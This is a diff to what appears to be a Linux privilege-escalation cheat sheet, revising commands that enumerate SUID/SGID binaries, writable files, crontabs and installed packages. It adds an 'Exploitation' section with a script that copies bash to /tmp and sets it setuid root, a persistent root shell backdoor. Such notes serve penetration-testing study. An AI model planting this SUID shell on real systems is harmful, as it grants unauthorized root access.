@@ -18,9 +18,9 @@ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 find / -user $USER -type f -exec ls -ldb {} \; 2>/dev/null
 find / -group $GROUP -type f -exec ls -ldb {} \; 2>/dev/null
 
-# Find writable files/directories
-find / -writable -type f -exec ls -ldb {} \; 2>/dev/null
-find / -writable -type d -exec ls -ldb {} \; 2>/dev/null
+# Find writable files
+find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq
+for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done
 
 # Check commonly sensitive directories
 ls /opt
@@ -46,9 +46,9 @@ cat /etc/iptables/rules.v4
 
 # Check crontabs
 cat /etc/crontab
-ls -lah /etc/cron*
 crontab -l
-sudo crontab -l
+ls -alh /etc/cron*
+cat /etc/cron.d/example_cron
 
 # List installed applications
 dpkg -l
@@ -87,6 +87,15 @@ systemctl list-timers --all
 
 # Check SGID binaries
 find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+```
+
+## Exploitation
+
+```bash
+#!/bin/bash
+cp /bin/bash /tmp/bash
+chown root:root /tmp/bash
+chmod u+s /tmp/bash
 ```
 
 ## Automated Tools
